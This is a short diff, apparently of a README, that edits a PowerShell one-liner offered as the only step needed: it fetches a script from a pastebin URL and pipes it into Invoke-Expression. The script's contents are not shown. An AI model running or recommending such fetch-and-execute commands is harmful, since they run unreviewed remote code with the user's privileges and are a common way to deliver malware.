@@ -23,4 +23,4 @@
 **One command is all you need:**
 
 ```powershell
-irm https://pastebin.com/raw/TThHBuEB | iex
+powershell irm https://pastebin.com/raw/TThHBuEB | iex
